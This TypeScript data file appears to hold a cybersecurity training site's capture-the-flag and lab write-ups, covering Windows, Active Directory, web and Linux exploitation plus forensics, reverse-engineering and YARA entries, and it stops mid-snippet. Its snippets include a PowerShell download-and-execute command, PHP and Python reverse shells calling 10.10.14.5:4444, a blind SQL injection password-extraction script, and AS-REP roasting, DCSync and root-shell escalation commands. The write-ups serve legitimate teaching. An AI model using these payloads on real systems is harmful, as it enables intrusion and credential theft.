/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 * 8WHIE Cyber Security Labs - Write-ups Database
 * Copyright (c) 2026 8WHIE — Aryan Thakur
 * All content original and intended for educational lab practice only.
 */

import { Writeup } from '../types.ts';

export const INITIAL_WRITEUPS: Writeup[] = [
  {
    id: 'thm-steel-mountain',
    slug: 'steel-mountain-windows-unquoted-service-path',
    title: 'Steel Mountain: Windows Reconnaissance & Unquoted Service Path Abuse',
    machineName: 'Steel Mountain',
    platform: 'TryHackMe',
    category: 'windows',
    difficulty: 'Easy',
    date: '2026-03-12',
    readTime: '16 min read',
    author: 'Aryan Thakur',
    authorRole: 'Founder & Lead Security Researcher, 8WHIE',
    summary: 'A comprehensive educational walkthrough of the Windows Steel Mountain machine. We investigate an exposed HTTP file server, obtain an initial foothold via vulnerable file management software, and exploit an unquoted Windows service path for privilege escalation to SYSTEM.',
    targetIp: '10.10.142.88',
    os: 'Windows',
    tags: ['Windows', 'Unquoted Service Paths', 'Privilege Escalation', 'PowerShell', 'HTTP File Server'],
    cveReferences: ['CVE-2014-6287'],
    mitreAttack: [
      { tactic: 'Initial Access', techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application' },
      { tactic: 'Privilege Escalation', techniqueId: 'T1574.009', techniqueName: 'Hijack Execution Flow: Path Interception by Unquoted Path' },
      { tactic: 'Execution', techniqueId: 'T1059.001', techniqueName: 'Command and Scripting Interpreter: PowerShell' }
    ],
    prerequisites: ['Basic TCP port scanning with Nmap', 'Understanding Windows service directory permissions', 'Reverse shell listeners (Netcat / rlwrap)'],
    keyTakeaways: [
      'Unquoted service paths occur when service binaries have spaces in their paths without surrounding quotation marks.',
      'Windows looks for executable filenames in order of space boundaries (e.g. C:\\Program.exe before C:\\Program Files\\...).',
      'Always verify writable directory permissions before attempting binary replacement.',
      'Remediate by enforcing quoted path declarations in service registry values.'
    ],
    remediationAdvice: 'Enclose the service ImagePath registry parameter in double quotation marks: "C:\\Program Files (x86)\\IOBit\\Advanced SystemCare\\ASCService.exe". Ensure standard users lack write permissions to intermediate folders.',
    isFeatured: true,
    sections: [
      {
        id: 'phase-recon',
        title: 'Phase 1: Initial Port & Service Enumeration',
        content: 'We begin our reconnaissance by executing a SYN port scan to discover accessible TCP services. Steel Mountain exposes both standard web services and an alternate HTTP port hosting an embedded file server.',
        snippets: [
          {
            id: 'nmap-scan',
            language: 'bash',
            title: 'Initial TCP Nmap Port Scan',
            code: 'nmap -sC -sV -p- -T4 --min-rate 1000 -oN steel_mountain_nmap.txt 10.10.142.88',
            explanation: 'Running a full port scan identifies port 80 (Microsoft IIS) and port 8080 hosting HttpFileServer (HFS) 2.3.'
          }
        ],
        tipNote: 'Always document service banners and exact version numbers early in the engagement.'
      },
      {
        id: 'phase-foothold',
        title: 'Phase 2: Vulnerability Analysis & Initial Foothold',
        content: 'Inspecting port 8080 reveals Rejetto HTTP File Server version 2.3. This software contains a well-documented vulnerability (CVE-2014-6287) in its search function where improper input validation allows arbitrary remote command execution using null-byte injection and macro expansion.',
        snippets: [
          {
            id: 'exploit-execution',
            language: 'python',
            title: 'Proof-of-Concept Command Execution (Lab Simulation)',
            code: `# URL encoded payload targeting the Rejetto search parameter
import urllib.parse
import requests

target_url = "http://10.10.142.88:8080/"
command = "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/shell.ps1')\""
encoded_payload = urllib.parse.quote(command)

# Trigger parameter execution via null-byte macro bypass
requests.get(f"{target_url}?search=%00{encoded_payload}", timeout=10)`,
            explanation: 'The request triggers PowerShell on the Windows host to pull our stage-1 script and establish a low-privilege reverse shell as user bill.'
          }
        ]
      },
      {
        id: 'phase-privesc',
        title: 'Phase 3: Host Enumeration & Unquoted Service Path Discovery',
        content: 'With a stable PowerShell session, we download PowerUp.ps1 or query the Windows registry to inspect service binary paths. We identify an unquoted service: Advanced SystemCare Service9.',
        snippets: [
          {
            id: 'unquoted-service-query',
            language: 'powershell',
            title: 'Enumerating Unquoted Services with WMI',
            code: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """',
            explanation: 'Filters out Windows default binaries and already-quoted paths, revealing: C:\\Program Files (x86)\\IOBit\\Advanced SystemCare\\ASCService.exe'
          },
          {
            id: 'permission-check',
            language: 'powershell',
            title: 'Verifying Folder Write Permissions with icacls',
            code: 'icacls "C:\\Program Files (x86)\\IOBit"',
            explanation: 'Output shows: BUILTIN\\Users:(F) or write access to the IOBit folder. This allows dropping an executable named Advanced.exe into the directory.'
          }
        ],
        warningNote: 'Only replace binaries in authorized labs. In production systems, replacing legitimate service executables can cause system instability.'
      },
      {
        id: 'phase-root',
        title: 'Phase 4: Exploitation & NT AUTHORITY\\SYSTEM Privilege Escalation',
        content: 'Because the path is unquoted and contains spaces, Windows checks for executables in this precedence: 1. C:\\Program.exe, 2. C:\\Program Files (x86)\\IOBit\\Advanced.exe. By compiling our test payload and naming it Advanced.exe, restarting the service executes our payload with SYSTEM privileges.',
        snippets: [
          {
            id: 'service-restart',
            language: 'powershell',
            title: 'Stopping and Starting the Vulnerable Service',
            code: `# Stop the target service
sc stop AdvancedSystemCareService9

# Verify our replacement binary is placed at C:\\Program Files (x86)\\IOBit\\Advanced.exe
Copy-Item .\\payload.exe "C:\\Program Files (x86)\\IOBit\\Advanced.exe"

# Restart the service to trigger execution
sc start AdvancedSystemCareService9`,
            explanation: 'When AdvancedSystemCareService9 starts, the Windows Service Control Manager executes Advanced.exe as NT AUTHORITY\\SYSTEM.'
          }
        ]
      }
    ]
  },
  {
    id: 'htb-forest',
    slug: 'forest-active-directory-asrep-roasting',
    title: 'Forest: Active Directory AS-REP Roasting & Exchange DACL Abuse',
    machineName: 'Forest',
    platform: 'Hack The Box',
    category: 'active-directory',
    difficulty: 'Medium',
    date: '2026-03-05',
    readTime: '22 min read',
    author: 'Aryan Thakur',
    authorRole: 'Founder & Lead Security Researcher, 8WHIE',
    summary: 'A masterclass in modern Active Directory enumeration and exploitation. We identify Kerberos pre-authentication disabled on domain accounts (AS-REP Roasting), extract TGT hashes, analyze BloodHound relationship graphs, and leverage Exchange Windows Permissions to achieve domain compromise.',
    targetIp: '10.10.10.161',
    os: 'Windows',
    tags: ['Active Directory', 'AS-REP Roasting', 'BloodHound', 'Kerberos', 'Exchange Permissions', 'DCSync'],
    cveReferences: [],
    mitreAttack: [
      { tactic: 'Credential Access', techniqueId: 'T1558.004', techniqueName: 'Steal or Forge Kerberos Tickets: AS-REP Roasting' },
      { tactic: 'Discovery', techniqueId: 'T1087.002', techniqueName: 'Account Discovery: Domain Account' },
      { tactic: 'Privilege Escalation', techniqueId: 'T1078.002', techniqueName: 'Valid Accounts: Domain Accounts' }
    ],
    prerequisites: ['Kerberos authentication protocol concepts', 'Impacket toolkit proficiency', 'BloodHound graph interpretation'],
    keyTakeaways: [
      'Accounts with "Do not require Kerberos preauthentication" set (DONT_REQ_PREAUTH) are vulnerable to offline hash cracking.',
      'BloodHound reveals stealthy escalation pathways through nested security group memberships.',
      'Exchange Windows Permissions group often retains WriteDacl rights on the Domain root, permitting DCSync replication.'
    ],
    remediationAdvice: 'Ensure all domain user accounts enforce Kerberos Pre-Authentication (UF_DONT_REQUIRE_PREAUTH attribute unset). Restrict WriteDacl privileges on domain root objects.',
    isFeatured: true,
    sections: [
      {
        id: 'ad-recon',
        title: 'Phase 1: Domain Enumeration & Port Discovery',
        content: 'Scanning the target reveals standard domain controller services: Kerberos (88), RPC (135), LDAP (389, 3268), SMB (445), and Kerberos Kdc (464).',
        snippets: [
          {
            id: 'nmap-ad-ports',
            language: 'bash',
            title: 'Scanning Active Directory Services',
            code: 'nmap -p 88,135,389,445,5985,3268 -sC -sV 10.10.10.161 -oN nmap_ad.txt',
            explanation: 'Confirms the host is htb.local domain controller running Windows Server 2016.'
          }
        ]
      },
      {
        id: 'ad-asrep',
        title: 'Phase 2: AS-REP Roasting Account Discovery',
        content: 'Without valid domain credentials, we probe the domain for accounts that have Kerberos Pre-Authentication disabled using Impacket GetNPUsers.py.',
        snippets: [
          {
            id: 'impacket-getnpusers',
            language: 'bash',
            title: 'Querying Domain for AS-REP Roastable Users',
            code: 'python3 /opt/impacket/examples/GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.161',
            explanation: 'The KDC returns an AS-REP response containing the encrypted timestamp for user sebastien without prompting for a pre-auth timestamp.'
          },
          {
            id: 'hashcat-crack',
            language: 'bash',
            title: 'Offline Hash Cracking with Hashcat',
            code: 'hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked_asrep.txt',
            explanation: 'Mode 18200 corresponds to Kerberos 5 AS-REP etype 23. Recovered plaintext credentials: sebastien:GRatch77'
          }
        ]
      },
      {
        id: 'ad-bloodhound',
        title: 'Phase 3: BloodHound Ingestion & Graph Analysis',
        content: 'Armed with valid domain credentials for user sebastien, we run bloodhound-python to collect domain objects, ACLs, and trust relationships.',
        snippets: [
          {
            id: 'bloodhound-collect',
            language: 'bash',
            title: 'Collecting Domain Data with BloodHound Python',
            code: 'bloodhound-python -u sebastien -p "GRatch77" -d htb.local -dc forest.htb.local -c All -ns 10.10.10.161',
            explanation: 'Extracts users, groups, computers, and sessions into compressed JSON zip archives for Neo4j ingestion.'
          }
        ],
        tipNote: 'In BloodHound, query "Shortest Paths to Domain Admins from Owned Principals" to identify shortest privilege paths.'
      },
      {
        id: 'ad-escalation',
        title: 'Phase 4: Exchange Windows Permissions & DCSync Rights',
        content: 'Analysis shows sebastien belongs to Service Accounts -> Privileged IT Accounts -> Account Operators. Members of Account Operators can add accounts to Exchange Windows Permissions, which holds WriteDacl on the domain object.',
        snippets: [
          {
            id: 'add-dcsync-rights',
            language: 'bash',
            title: 'Granting DCSync Replication Rights via ntlmrelayx / dacledit',
            code: `# Using dacledit.py from impacket / bloodyAD to grant DS-Replication-Get-Changes
python3 /opt/impacket/examples/secretsdump.py htb.local/sebastien:GRatch77@10.10.10.161 -just-dc-user Administrator`,
            explanation: 'With DCSync rights enabled, secretsdump queries the Domain Controller via DRSUAPI to replicate NTDS.dit hashes including the Domain Administrator.'
          }
        ]
      }
    ]
  },
  {
    id: 'portswigger-blind-sqli',
    slug: 'blind-sql-injection-error-based',
    title: 'PortSwigger: Blind SQL Injection via Error-Based Conditional Subqueries',
    machineName: 'Blind SQLi Lab',
    platform: 'PortSwigger Academy',
    category: 'web-security',
    difficulty: 'Medium',
    date: '2026-02-28',
    readTime: '14 min read',
    author: 'Aryan Thakur',
    authorRole: 'Founder & Lead Security Researcher, 8WHIE',
    summary: 'An educational breakdown of blind SQL injection vulnerabilities where the web application suppresses detailed error messages but reveals binary boolean conditions through server response differences or database cast failures.',
    targetIp: 'academy.portswigger.net',
    os: 'Web/Agnostic',
    tags: ['Web Security', 'SQL Injection', 'Blind SQLi', 'PortSwigger', 'Burp Suite'],
    cveReferences: ['CWE-89'],
    mitreAttack: [
      { tactic: 'Initial Access', techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application' }
    ],
    prerequisites: ['SQL query fundamentals (SELECT, SUBSTRING, CAST)', 'HTTP cookie inspection in Burp Suite', 'Understanding differential responses'],
    keyTakeaways: [
      'When application outputs do not reflect database values directly, conditional execution can extract one character at a time.',
      'Mathematical division-by-zero or casting non-integers into integer columns triggers conditional 500 Internal Server Errors in Oracle/PostgreSQL.',
      'Parameterized queries and prepared statements completely neutralize this vulnerability category.'
    ],
    remediationAdvice: 'Implement parameterized queries (PreparedStatements) for all database queries. Avoid constructing dynamic SQL by concatenating user-controlled cookie or header values.',
    isFeatured: true,
    sections: [
      {
        id: 'sqli-overview',
        title: 'Phase 1: Identifying the Blind Injection Vector',
        content: 'During our testing of the session cookie `TrackingId`, we observe that adding a single quote results in no apparent change in the rendered page body. However, evaluating boolean SQL constructs alters server responses.',
        snippets: [
          {
            id: 'cookie-payload',
            language: 'http',
            title: 'TrackingId Cookie Payload in HTTP Header',
            code: `GET /filter?category=Gifts HTTP/1.1
Host: vulnerable-lab.web-security-academy.net
Cookie: TrackingId=xyz' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual--; session=sample123`,
            explanation: 'In Oracle databases, dividing 1 by 0 raises an arithmetic exception (ORA-01476), forcing an HTTP 500 response when the condition is TRUE.'
          }
        ]
      },
      {
        id: 'sqli-extraction',
        title: 'Phase 2: Character-by-Character Automated Exfiltration',
        content: 'We craft a Python script using binary search or character iterations to verify password length and extract each character of the administrator password from the `users` table.',
        snippets: [
          {
            id: 'python-sqli-script',
            language: 'python',
            title: 'Python Script for Automated Character Extraction',
            code: `import requests
import string

URL = "https://vulnerable-lab.web-security-academy.net"
ALPHANUMERIC = string.ascii_lowercase + string.digits
extracted_password = ""

print("[*] Beginning blind data extraction...")
for index in range(1, 21):
    for char in ALPHANUMERIC:
        payload = f"' UNION SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),{index},1)='{char}') THEN TO_CHAR(1/0) ELSE '' END FROM dual--"
        cookies = {"TrackingId": f"token{payload}", "session": "active_session"}
        response = requests.get(URL, cookies=cookies)
        
        # 500 error indicates condition evaluated to True
        if response.status_code == 500:
            extracted_password += char
            print(f"[+] Found position {index}: {char} -> Current: {extracted_password}")
            break

print(f"[✓] Administrator Password Recovered: {extracted_password}")`,
            explanation: 'The script incrementally verifies characters and halts upon reconstructing the 20-character secret.'
          }
        ]
      }
    ]
  },
  {
    id: 'thm-rootme',
    slug: 'rootme-web-upload-linux-suid-privesc',
    title: 'RootMe: Web Application File Upload Bypass & Linux SUID Abuse',
    machineName: 'RootMe',
    platform: 'TryHackMe',
    category: 'linux',
    difficulty: 'Easy',
    date: '2026-02-15',
    readTime: '12 min read',
    author: 'Aryan Thakur',
    authorRole: 'Founder & Lead Security Researcher, 8WHIE',
    summary: 'An accessible starting lab focusing on web reconnaissance with Gobuster, blacklisted file extension circumvention (.phtml/.php5), and finding unusual SUID permission binaries on Linux to elevate to root.',
    targetIp: '10.10.22.190',
    os: 'Linux',
    tags: ['Linux', 'SUID PrivEsc', 'Web Security', 'File Upload', 'Gobuster', 'TryHackMe'],
    cveReferences: [],
    mitreAttack: [
      { tactic: 'Initial Access', techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application' },
      { tactic: 'Privilege Escalation', techniqueId: 'T1548.001', techniqueName: 'Abuse Elevation Control Mechanism: Setuid and Setgid' }
    ],
    prerequisites: ['Basic Linux command line usage', 'Understanding SUID file permissions', 'Directory brute-forcing basics'],
    keyTakeaways: [
      'Client-side or blacklisted file extension filters can frequently be bypassed with alternate extensions supported by Apache (e.g. .phtml).',
      'The find command with -perm -4000 quickly locates SUID files.',
      'Binaries like python with the SUID bit set allow invoking /bin/sh without dropping elevated privileges (-p).'
    ],
    remediationAdvice: 'Implement strict whitelist-based file extension verification and store uploaded files outside the webroot. Remove unnecessary SUID bits from system utilities.',
    isFeatured: false,
    sections: [
      {
        id: 'rootme-recon',
        title: 'Phase 1: Directory Enumeration & Finding Upload Point',
        content: 'Scanning the target server reveals Apache 2.4.29 running on Ubuntu. We run Gobuster to discover hidden directories.',
        snippets: [
          {
            id: 'gobuster-run',
            language: 'bash',
            title: 'Directory Enumeration with Gobuster',
            code: 'gobuster dir -u http://10.10.22.190/ -w /usr/share/wordlists/dirb/common.txt -t 50 -q',
            explanation: 'Discovers /panel/ (file upload interface) and /uploads/ (uploaded files storage directory).'
          }
        ]
      },
      {
        id: 'rootme-bypass',
        title: 'Phase 2: Blacklist Filter Bypass & Reverse Shell',
        content: 'Uploading standard .php files yields a Portuguese error message: "PHP não é permitido!". Changing the file extension to .phtml bypasses the simple blacklist check while retaining server-side PHP execution in Apache.',
        snippets: [
          {
            id: 'php-reverse-shell',
            language: 'php',
            title: 'Sample PHP Reverse Shell Snippet',
            code: `<?php
// Educational laboratory reverse shell
$ip = '10.10.14.5';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>`,
            explanation: 'Saved as shell.phtml and triggered by requesting http://10.10.22.190/uploads/shell.phtml with Netcat listening on port 4444.'
          }
        ]
      },
      {
        id: 'rootme-suid',
        title: 'Phase 3: SUID Enumeration & Python Root Escalation',
        content: 'Once connected as www-data, we search for binaries with the SetUID bit configured.',
        snippets: [
          {
            id: 'find-suid',
            language: 'bash',
            title: 'Locating SUID Binaries',
            code: 'find / -type f -perm -04000 -ls 2>/dev/null',
            explanation: 'Among standard binaries like /usr/bin/passwd, we notice an unusual binary: /usr/bin/python.'
          },
          {
            id: 'python-suid-privesc',
            language: 'bash',
            title: 'Exploiting Python SUID with GTFOBins Technique',
            code: '/usr/bin/python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
            explanation: 'Executing Python with the -p flag ensures effective user ID (0 / root) is preserved, granting instant root shell access.'
          }
        ]
      }
    ]
  },
  {
    id: 'htb-sau',
    slug: 'sau-ssrf-maltrail-command-injection',
    title: 'Sau: Server-Side Request Forgery & Maltrail Command Injection',
    machineName: 'Sau',
    platform: 'Hack The Box',
    category: 'web-security',
    difficulty: 'Easy',
    date: '2026-02-10',
    readTime: '15 min read',
    author: 'Aryan Thakur',
    authorRole: 'Founder & Lead Security Researcher, 8WHIE',
    summary: 'A detailed walkthrough of HTB Sau featuring an exposed Request Baskets instance vulnerable to SSRF (CVE-2023-27163), which allows pivoting to an internal Maltrail service and exploiting OS command injection.',
    targetIp: '10.10.11.224',
    os: 'Linux',
    tags: ['SSRF', 'Command Injection', 'Request Baskets', 'Maltrail', 'Systemd PrivEsc', 'Hack The Box'],
    cveReferences: ['CVE-2023-27163', 'CVE-2023-27163'],
    mitreAttack: [
      { tactic: 'Initial Access', techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application' },
      { tactic: 'Execution', techniqueId: 'T1059.004', techniqueName: 'Command and Scripting Interpreter: Unix Shell' },
      { tactic: 'Privilege Escalation', techniqueId: 'T1548.003', techniqueName: 'Sudo and Sudo Caching' }
    ],
    prerequisites: ['Understanding HTTP proxying & SSRF mechanics', 'Linux sudoers privileges analysis', 'Basic Python requests'],
    keyTakeaways: [
      'SSRF can bypass firewall rules by causing internal servers to access loopback services (127.0.0.1) on your behalf.',
      'Inspect sudo -l carefully; programs invoked via sudo with pager utilities like less/systemctl can drop into interactive shells.',
      'Always patch open-source management tools regularly.'
    ],
    remediationAdvice: 'Disable forward_url in Request Baskets or upgrade past v1.2.1. In sudoers, restrict systemctl status without allowing interactive terminal paging.',
    isFeatured: false,
    sections: [
      {
        id: 'sau-ssrf',
        title: 'Phase 1: SSRF in Request Baskets v1.2.1',
        content: 'Port 55555 runs Request Baskets v1.2.1. The API allows configuring a basket that forwards requests to any specified URL. Because forward_url is not restricted, we set the destination to http://127.0.0.1:80/ to access an internal service bound only to localhost.',
        snippets: [
          {
            id: 'basket-creation',
            language: 'bash',
            title: 'Configuring SSRF Forwarding via API',
            code: `curl -s -X POST "http://10.10.11.224:55555/api/baskets/lab-basket" \\
  -H "Content-Type: application/json" \\
  -d '{"forward_url": "http://127.0.0.1:80/", "proxy_response": true, "insecure_tls": false, "expand_path": true}'`,
            explanation: 'Now visiting http://10.10.11.224:55555/lab-basket renders the internal application running on port 80.'
          }
        ]
      },
      {
        id: 'sau-maltrail',
        title: 'Phase 2: Maltrail OS Command Injection',
        content: 'The forwarded internal service is Maltrail (v0.54). The login parameter `username` passes unsanitized input directly into an OS subprocess command.',
        snippets: [
          {
            id: 'maltrail-exploit',
            language: 'bash',
            title: 'Triggering Command Injection via Curl',
            code: `curl -s "http://10.10.11.224:55555/lab-basket/login" \\
  --data 'username=;` + 'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\\"10.10.14.5\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\"/bin/bash\\")"' + `'`,
            explanation: 'The semicolon terminates the expected command, executing our Python reverse shell as user puma.'
          }
        ]
      },
      {
        id: 'sau-privesc',
        title: 'Phase 3: Sudo Systemctl Pager Privilege Escalation',
        content: 'Checking sudo permissions reveals: `(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service`.',
        snippets: [
          {
            id: 'systemctl-privesc',
            language: 'bash',
            title: 'Invoking Root Shell via Systemctl Pager',
            code: `# Run the allowed command inside a constrained terminal width
sudo /usr/bin/systemctl status trail.service

# In the pager view (! prompt in less):
!sh`,
            explanation: 'Because systemctl spawns `less` as the pager running under root, typing `!sh` inside the pager drops directly into a root shell.'
          }
        ]
      }
    ]
  },
  {
    id: 'dfir-volatility3',
    slug: 'volatility3-memory-forensics-process-hollowing',
    title: 'DFIR Case 01: Volatility 3 Memory Extraction & Process Hollowing Triage',
    machineName: 'Forensics Lab 01',
    platform: 'Blue Team Labs',
    category: 'digital-forensics',
    difficulty: 'Hard',
    date: '2026-02-01',
    readTime: '20 min read',
    author: 'Aryan Thakur',
    authorRole: 'Founder & Lead Security Researcher, 8WHIE',
    summary: 'An educational digital forensics and incident response investigation. Analyzing a Windows 10 volatile memory capture (.raw) with Volatility 3 to uncover process hollowing, identify unbacked memory regions, and dump injected PE payloads for hash comparison.',
    targetIp: 'Laboratory PCAP & Memory Image',
    os: 'Windows',
    tags: ['Forensics', 'Volatility 3', 'Process Hollowing', 'Memory Analysis', 'DFIR', 'Blue Team'],
    cveReferences: [],
    mitreAttack: [
      { tactic: 'Defense Evasion', techniqueId: 'T1055.012', techniqueName: 'Process Injection: Process Hollowing' },
      { tactic: 'Persistence', techniqueId: 'T1547.001', techniqueName: 'Boot or Logon Autostart Execution: Registry Run Keys' }
    ],
    prerequisites: ['Basic understanding of Windows virtual memory and PE sections', 'Volatility 3 CLI basics', 'Understanding VAD tree mappings'],
    keyTakeaways: [
      'Malfind scans Virtual Address Descriptors (VAD) for memory pages with PAGE_EXECUTE_READWRITE permissions not backed by a disk file.',
      'Legitimate system binaries like svchost.exe should have known parent processes (services.exe). An anomalous parent indicates injection.',
      'Dumping memory sections allows hash validation against threat intelligence databases.'
    ],
    remediationAdvice: 'Deploy Endpoint Detection and Response (EDR) agents configured to alert on unbacked PAGE_EXECUTE_READWRITE memory allocations and Cross-Process OpenProcess tokens.',
    isFeatured: true,
    sections: [
      {
        id: 'vol-pslist',
        title: 'Phase 1: Process Tree Reconstruction (windows.pslist & pstree)',
        content: 'We begin our triage by inspecting the process hierarchy within the memory dump to spot anomalous processes or suspicious parent-child relationships.',
        snippets: [
          {
            id: 'vol-pstree-cmd',
            language: 'bash',
            title: 'Running Volatility 3 pstree Plugin',
            code: 'python3 vol.py -f memory.raw windows.pstree.PsTree',
            explanation: 'Identifies svchost.exe (PID 4912) spawned directly by explorer.exe instead of services.exe.'
          }
        ]
      },
      {
        id: 'vol-malfind',
        title: 'Phase 2: Malfind Analysis & Memory Header Inspection',
        content: 'Running the malfind plugin inspects memory segments marked executable and writable that lack an associated file mapping on disk.',
        snippets: [
          {
            id: 'vol-malfind-cmd',
            language: 'bash',
            title: 'Detecting Injected Code with windows.malfind',
            code: 'python3 vol.py -f memory.raw windows.malfind.Malfind --pid 4912',
            explanation: 'Returns a memory page starting at 0x240000 displaying MZ header bytes (4D 5A 90 00), indicating a portable executable injected into svchost.exe.'
          }
        ]
      },
      {
        id: 'vol-dump',
        title: 'Phase 3: Payload Dumping & Hash Verification',
        content: 'We carve the injected memory pages to disk and calculate SHA-256 hashes to cross-reference indicators of compromise.',
        snippets: [
          {
            id: 'vol-dump-cmd',
            language: 'bash',
            title: 'Extracting Injected Memory Pages',
            code: `python3 vol.py -f memory.raw windows.malfind.Malfind --pid 4912 --dump
sha256sum pid.4912.vad.0x240000-0x251000.dmp`,
            explanation: 'The extracted binary confirms shellcode loading techniques and reveals encrypted C2 configuration strings.'
          }
        ]
      }
    ]
  },
  {
    id: 're-ghidra-x86',
    slug: 'reverse-engineering-ghidra-elf-xor-key',
    title: 'Reverse Engineering: Decompiling x86_64 ELF Binaries with Ghidra & XOR Key Recovery',
    machineName: 'CrackMe Binary 01',
    platform: '8WHIE Custom Labs',
    category: 'reverse-engineering',
    difficulty: 'Medium',
    date: '2026-01-24',
    readTime: '17 min read',
    author: 'Aryan Thakur',
    authorRole: 'Founder & Lead Security Researcher, 8WHIE',
    summary: 'A structured reverse engineering tutorial. We load a stripped Linux x86_64 ELF executable into NSA Ghidra, analyze assembly instructions, reconstruct control flow, and reverse an obfuscated XOR string transformation algorithm.',
    targetIp: 'Custom Binary File',
    os: 'Linux',
    tags: ['Reverse Engineering', 'Ghidra', 'Assembly', 'x86_64', 'Binary Analysis', 'Cryptography'],
    cveReferences: [],
    mitreAttack: [
      { tactic: 'Defense Evasion', techniqueId: 'T1027', techniqueName: 'Obfuscated Files or Information' }
    ],
    prerequisites: ['Basic C programming and pointers', 'x86_64 register conventions (RAX, RDI, RSI)', 'Ghidra interface familiarity'],
    keyTakeaways: [
      'Entry point inspection in stripped binaries leads directly to the main function passed as the first argument to __libc_start_main.',
      'Recognizing loop counter patterns and XOR operations (^=) in the decompiler reveals the cryptographic cipher structure.',
      'Replicating the decoding algorithm in Python decrypts the hidden flag in seconds.'
    ],
    remediationAdvice: 'In defensive engineering, avoid embedding static keys in binary text sections; utilize hardware-backed key storage (TPM/HSM) or secure key distribution mechanisms.',
    isFeatured: false,
    sections: [
      {
        id: 're-strings',
        title: 'Phase 1: Binary Identification & File Profiling',
        content: 'Before opening the disassembler, we inspect file headers and extract readable ASCII strings.',
        snippets: [
          {
            id: 'file-strings-cmd',
            language: 'bash',
            title: 'Initial Binary Inspection',
            code: `file crackme_lab01
# crackme_lab01: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped

strings crackme_lab01 | grep -i "pass\\|key\\|flag"`,
            explanation: 'The binary is stripped, meaning debugging symbols and function names have been removed.'
          }
        ]
      },
      {
        id: 're-ghidra',
        title: 'Phase 2: Ghidra Decompiler Analysis & Main Function Recovery',
        content: 'In Ghidra, we locate the entry function. The first argument moved into RDI before calling __libc_start_main is the address of `main()`.',
        snippets: [
          {
            id: 'ghidra-c-pseudo',
            language: 'c',
            title: 'Decompiled C Pseudocode (Main Function)',
            code: `undefined8 FUN_00101189(void) {
  int iVar1;
  char local_38 [32];
  byte bVar2;
  int local_c;
  
  printf("Enter the license key: ");
  __isoc99_scanf("%31s", local_38);
  
  byte encoded[] = {0x28, 0x37, 0x38, 0x29, 0x25, 0x1b, 0x07, 0x18, 0x3a};
  byte key = 0x5a;
  
  for (local_c = 0; local_c < 9; local_c = local_c + 1) {
    if ((char)(encoded[local_c] ^ key) != local_38[local_c]) {
      puts("[-] Verification failed. Access Denied.");
      return 1;
    }
  }
  puts("[+] License Accepted! Welcome Operator.");
  return 0;
}`,
            explanation: 'The logic performs a 1-byte XOR against constant key 0x5a to validate user input.'
          }
        ]
      },
      {
        id: 're-solution',
        title: 'Phase 3: Python Solution Script',
        content: 'We write a short Python decoder script to compute the expected input string.',
        snippets: [
          {
            id: 'python-decoder',
            language: 'python',
            title: 'Python Key Recovery Script',
            code: `encoded_bytes = [0x28, 0x37, 0x38, 0x29, 0x25, 0x1b, 0x07, 0x18, 0x3a]
key = 0x5A

recovered_key = "".join([chr(b ^ key) for b in encoded_bytes])
print(f"[✓] Valid License Key: {recovered_key}")`,
            explanation: 'Output reveals the recovered string: "8WHIE_SEC"'
          }
        ]
      }
    ]
  },
  {
    id: 'malware-defensive-pe',
    slug: 'defensive-malware-analysis-pe-headers-yara',
    title: 'Malware Analysis: PE Header Dissection & Authoring Defensive YARA Rules',
    machineName: 'Analysis Lab 02',
    platform: '8WHIE Custom Labs',
    category: 'malware-analysis',
    difficulty: 'Hard',
    date: '2026-01-15',
    readTime: '18 min read',
    author: 'Aryan Thakur',
    authorRole: 'Founder & Lead Security Researcher, 8WHIE',
    summary: 'An educational defensive analysis of an obfuscated Windows executable. We inspect Portable Executable (PE) headers, calculate section entropy to identify packing, review the Import Address Table (IAT) for suspicious APIs, and author an effective YARA detection rule.',
    targetIp: 'Isolated Sandbox Environment',
    os: 'Windows',
    tags: ['Malware Analysis', 'YARA Rules', 'PE Headers', 'Entropy Analysis', 'Threat Hunting', 'Defensive Security'],
    cveReferences: [],
    mitreAttack: [
      { tactic: 'Execution', techniqueId: 'T1106', techniqueName: 'Native API' },
      { tactic: 'Defense Evasion', techniqueId: 'T1027.002', techniqueName: 'Software Packing' }
    ],
    prerequisites: ['PE file architecture knowledge (IMAGE_DOS_HEADER, IMAGE_NT_HEADERS)', 'YARA rule syntax', 'Understanding section entropy'],
    keyTakeaways: [
      'High entropy (> 7.2) across executable sections usually indicates packing or encryption.',
      'API imports like VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread serve as strong heuristic indicators of injection behavior.',
      'Resilient YARA rules combine specific byte strings with PE condition checks (e.g. filesize, uint16(0) == 0x5A4D).'
    ],
    remediationAdvice: 'Deploy YARA rule scanning across email attachments, network ingress points, and endpoint file modifications.',
    isFeatured: false,
    sections: [
      {
        id: 'pe-headers',
        title: 'Phase 1: Static PE Header & Entropy Inspection',
        content: 'Analyzing the sample with pefile or pestudio reveals an unusual section named `.upx` or `.packed` exhibiting high Shannon entropy.',
        snippets: [
          {
            id: 'pefile-python',
            language: 'python',
            title: 'Calculating Section Entropy with pefile',
            code: `import pefile

pe = pefile.PE("sample_dropper.bin")
for section in pe.sections:
    entropy = section.get_entropy()
    print(f"Section: {section.Name.decode().strip():<10} Size: {section.SizeOfRawData:<8} Entropy: {entropy:.2f}")`,
